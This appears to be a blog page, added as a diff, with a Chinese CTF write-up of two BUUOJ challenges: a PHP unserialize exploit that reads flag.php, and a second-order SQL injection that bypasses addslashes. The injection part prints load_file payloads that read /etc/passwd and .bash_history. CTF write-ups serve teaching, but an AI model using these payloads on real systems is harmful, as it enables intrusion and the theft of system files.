@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0X01：[网鼎杯 2020 青龙组]AreUSerialz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuoj3">
+<meta property="og:url" content="http://yoursite.com/2020/05/16/buuoj3/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="0X01：[网鼎杯 2020 青龙组]AreUSerialz">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/05/16/buuoj3/1.png">
+<meta property="article:published_time" content="2020-05-16T14:34:22.000Z">
+<meta property="article:modified_time" content="2020-05-17T06:34:07.652Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="buu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/05/16/buuoj3/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/05/16/buuoj3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>buuoj3 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/16/buuoj3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buuoj3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-16 22:34:22" itemprop="dateCreated datePublished" datetime="2020-05-16T22:34:22+08:00">2020-05-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-05-17 14:34:07" itemprop="dateModified" datetime="2020-05-17T14:34:07+08:00">2020-05-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="0X01：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#0X01：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="0X01：[网鼎杯 2020 青龙组]AreUSerialz"></a>0X01：[网鼎杯 2020 青龙组]AreUSerialz<a id="more"></a></h4><p>这道题当天比赛的时候就大概看了一下，现在buu上复现了发现也不是很难，来看看吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化，对传入的str参数进行反序列化，字符的ASCII都要在32~125之间</p>
+<p>反序列化会调用__destruct析构方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到，===是强比较，也就是说字符值和类型都要相同，如果不同就进入process()函数中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从这可以看到，我们想要读取文件，那么op的值要为2，刚好这里是用的若比较，直接让op=2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       $res = <span class="string">""</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">           $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>read函数中的filename是可控的，赋值为flag.php，再以output函数输出</p>
+<p>这里有个问题，protect对象序列化时会有%00,%00对应的ascii值为0不在那个范围内，找资料发现php7.1对于属性类型不敏感，改为public</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>给str传入序列化数据，在源码处找到flag</p>
+<h4 id="0X02：-网鼎杯-2018-Comment"><a href="#0X02：-网鼎杯-2018-Comment" class="headerlink" title="0X02：[网鼎杯 2018]Comment"></a>0X02：[网鼎杯 2018]Comment</h4><p>打开是一个留言板界面，F12找到提示：程序员GIT写一半跑路了,都没来得及Commit :)</p>
+<p>用githack找到文件，但是只显示了一部分，看了wp，用的wyh师傅的githack可以恢复，拿到了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);<span class="comment">//第一次过滤</span></span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',//未过滤直接用</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>addslashes绕过方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置数据库字符为gbk导致宽字节注入</span><br><span class="line">使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</span><br><span class="line">url解码导致绕过addslashes</span><br><span class="line">base64解码导致绕过addslashes</span><br><span class="line">json编码导致绕过addslashes</span><br><span class="line">没有使用引号保护字符串，直接无视addslashes</span><br><span class="line">使用了stripslashes(去掉了\)</span><br><span class="line">字符替换导致的绕过addslashes</span><br></pre></td></tr></table></figure>
+
+<p>category只过=过滤了一次，二次注入</p>
+<p>尝试发帖，要登录，账号密码告知，密码后三位需要爆破，爆破出666</p>
+<p>这里用/**/来注释</p>
+<p>123’,content=user(),/*,评论中写*/#就闭合了语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'123'</span>,<span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="comment">#',</span></span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>下面直接给payload，就不多说了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">',content=(<span class="keyword">select</span>( <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>))),<span class="comment">/*</span></span><br><span class="line"><span class="comment">',content=(select(load_file("/home/www/.bash_history"))),/*</span></span><br><span class="line"><span class="comment">',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*/</span>/发现长度不够改为<span class="keyword">hex</span>读取</span><br><span class="line"><span class="string">',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/16/buuoj3/1.png" class="" title="examplename">
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2020/05/16/buuoj3/" title="buuoj3">http://yoursite.com/2020/05/16/buuoj3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buu/" rel="tag"># buu</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/11/buuoj2/" rel="prev" title="buuoj2">
+      <i class="fa fa-chevron-left"></i> buuoj2
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
